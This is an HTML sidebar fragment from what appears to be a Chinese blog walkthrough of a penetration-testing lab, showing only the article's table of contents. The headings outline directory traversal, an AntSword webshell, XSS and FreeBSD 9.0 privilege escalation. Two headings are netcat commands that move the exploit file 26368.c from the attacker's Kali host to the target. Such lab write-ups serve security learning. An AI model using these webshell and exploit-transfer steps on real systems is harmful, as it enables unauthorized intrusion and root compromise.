class="toc-text">suid尝试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E6%9C%89%E7%89%B9%E6%9D%83%E6%96%87%E4%BB%B6"><span class="toc-text">查看是否有特权文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95python2-7%E6%8F%90%E6%9D%83"><span class="toc-text">尝试python2.7提权</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-text">前提</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#kali-ip-192-168-129-152"><span class="toc-text">kali ip 192.168.129.152</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E6%94%B6%E9%9B%86"><span class="toc-text">ip收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%94%B6%E9%9B%86"><span class="toc-text">端口收集</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-text">渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ehole%E6%89%AB%E6%8F%8F%E6%8C%87%E7%BA%B9"><span class="toc-text">ehole扫描指纹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E7%A7%92%E6%98%AF%E5%90%A6%E6%9C%89%E6%BC%8F%E6%B4%9E"><span class="toc-text">扫秒是否有漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%86%85%E5%AE%B9"><span class="toc-text">查看内容</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-text">目录穿越</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8Bapache%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-text">可以查看apache的配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E5%B0%9D%E8%AF%95"><span class="toc-text">手工尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E8%BF%9E%E4%B8%8D%E4%B8%8A%E5%8E%9F%E5%9B%A0-%E5%BE%97%E7%94%A8%E9%80%82%E7%94%A8%E5%90%88%E9%80%82%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">蚁剑连不上原因:得用适用合适的一句话木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss"><span class="toc-text">xss</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8080%E7%AB%AF%E5%8F%A3"><span class="toc-text">8080端口</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E6%BC%8F%E6%B4%9E"><span class="toc-text">搜索漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#searchsploit-FreeBSD-9-0"><span class="toc-text">searchsploit  FreeBSD 9.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kali-%E5%8F%91%E9%80%81%E6%96%87%E4%BB%B6-nc-lvp-5555"><span class="toc-text">kali 发送文件 nc -lvp 5555&lt;26368.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E6%9C%BA%E6%8E%A5%E5%8F%97%E6%96%87%E4%BB%B6-nc-192-168-129-152-5555-111-c"><span class="toc-text">客户机接受文件 nc 192.168.129.152 5555 &gt;111.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%EF%BC%8C%E6%89%A7%E8%A1%8C"><span class="toc-text">编译，执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="toc-text">获取信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
 </div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
